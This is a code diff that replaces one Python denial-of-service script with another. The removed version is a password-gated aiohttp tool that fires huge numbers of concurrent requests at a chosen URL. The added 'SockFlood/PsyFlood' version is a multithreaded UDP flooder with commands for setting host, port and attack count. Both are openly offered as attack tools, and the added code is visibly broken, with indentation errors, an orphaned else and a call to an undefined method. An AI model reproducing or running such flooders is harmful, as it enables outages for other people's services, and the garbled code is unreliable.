@@ -1,75 +1,91 @@
-#!/usr/bin/python3
-# -*- coding: utf-8 -*-
 import os
 import sys
 import time
-import asyncio
-import aiohttp
+import socket
+import string
+import random
+import threading
 import fade
+from colorama import Fore, Back, Style
 
-# Clear command prompt based on the operating system
-if os.name == "nt":  # Windows
-    os.system("cls")
-else:  # Unix/Linux/Mac
-    os.system("clear")
-
-attemps = 0
-logo = """
-╔══════════════════════════════════════════════════════╗
-║\033[33m                ~ H U D A I R U L  A L - A Q S H A ~          \033[31m║
-║\033[32m                    I N T E R N A L  S C R I P T              \033[31m║
-║\033[96m                           By: Aby'Walidein                   \033[31m║
-║\033[37m                               ——o0o——                        \033[31m║
-╚══════════════════════════════════════════════════════╝033[0m
-"""
-faded_text = fade.fire(logo)
-print(faded_text)
-while attemps < 100:
-    username = input("\033[38;5;2mUsername: \033[0m")
-    password = input("\033[38;5;2mPassword: \033[0m")
-
-    if username == 'cebong' and password == 'go*block':
-        print("\033[48;5;7m═⟩⟩ \033[0m")
-        break
+class SockFlood:
+	def __init__(self):
+		os.system("cls")
     else:
-        print('Incorrect credentials. Check if you have Caps lock on and try again.')
-        attemps += 1
-        continue
+        os.system("clear")
+attemps = 0
+Logo = """
+	╔══════╗	
+	██████  ║
+    ╚══════╝
 
-ask = fade.pinkred("\033[48;5;4m═⟩⟩ Enter URL (http://example.com:\033[0m \033[32m\033[0m")
-url = input(ask)
+"""
+    def start_attack(self,host,port=None):
+		self.sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+		try:
+			url_path=str(string.ascii_letters + string.digits + string.punctuation)
+			byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
+			if not port:
+				self.sock.sendto(byt,(host,80))
+			elif port:
+				self.sock.sendto(byt,(host,int(port)))
+			print(Fore.WHITE+"""[+] Sent Byte Successfully""")
+		except Exception as e:
+			print(Fore.RED+f"""
+	[-] Socket ERROR! Fatal X_X
+	[-] EXCEPTION : {e}
+						""")
 
-ask = fade.pinkred('txt')
-print("\033[32mLoading......")
+	def command_parser(self,command):
+		if command=="help":
+			print(Fore.WHITE+"""
+	Welcome To PsyFlood Help Menu - 
 
-async def increment_view_count(session):
-    try: 
-        async with session.get(url) as response:
-            if response.status == 200:
-                time.sleep(0.01)
-                print("\033[48;5;2mInfo target \033[0m \033[33m" +str(url)+ " \033[35work\033[0m")
-            else:
-                time.sleep(0.01)
-                print("\033[38;5;2mInfo target \033[33m" +str(url)+ " \033[35work\033[0m")          
-    except aiohttp.ClientError as e:
-            time.sleep(0.01)
-            print("\033[48;5;1mInfo target \033[0m \033[38;5;3m" +str(url)+ "  \033[38;5;7mMaybe down!\033[0m")
-            print("\033[48;5;1mInfo target \033[0m \033[38;5;3m" +str(view_count)+ "  \033[38;5;7mMaybe down!\033[0m")
-        
+	(+) host %HOST% - Enter the Host Domain or Ip Address [!Required]
+	(+) port %PORT% - Enter a custom port if you have, or just don't use it will use port 80
+	(+) attacks %AMOUNT% - Enter a custom amount of attack, Default 1000
+	(+) start - Will start attacking and display outputs on console
+	""")
+		if "host " in command:
+			self.host=command.replace("host ","").replace("https://", "").replace("http://", "").replace("www.", "")
+			print(Fore.WHITE+f"""
+	[+] Successfully Set Host as {self.host}
+				""")
+		elif "port " in command:
+			self.portnum=command.replace("port ","")
+			print(Fore.WHITE+f"""
+	[+] Successfully Set Port to {self.portnum}
+				""")
+		elif command=="start":
+			print(self.portnum)
+			if self.host and self.portnum:
+				if int(self.threads):
+					for i in range(1,int(self.threads)):
+						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
+				else:
+					for i in range(1,1000):
+						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
+			elif self.host and not self.portnum:
+				if int(self.threads):
+					for i in range(1,int(self.threads)):
+						threading.Thread(target=self.start_attack(self.host)).start()
+				else:
+					for i in range(1,1000):
+						threading.Thread(target=self.start_attack(self.host)).start()
+		elif "attacks " in command:
+			self.threads=command.replace("attacks ","")
+			print(Fore.WHITE+f"""
+	[+] Successfully Set Threads to {self.threads}
+				""")
 
-async def main():
-    connector = aiohttp.TCPConnector(limit=None)  # Enable connection pooling
-    async with aiohttp.ClientSession(connector=connector) as session:
-        tasks = []
-        for _ in range(19999):  # Increase the number of concurrent requests
-            task = asyncio.create_task(increment_view_count(session))
-            tasks.append(task)
-            for i in range(19999):  # Increase the number of concurrent requests
-                task = asyncio.create_task(increment_view_count(session))
-                tasks.append(task)
-            await asyncio.gather(*tasks)
-        await asyncio.gather(*tasks)
+    
+    def run(self):
+		self.graphics()
+		while True:
+			self.command_parser(input(Fore.CYAN+f"${os.environ.get('USERNAME')}$>> "))
+
+if __name__=="__main__":
+	app=SockFlood()
+	app.run()
 
 
-if __name__ == "__main__":
-    asyncio.run(main())      
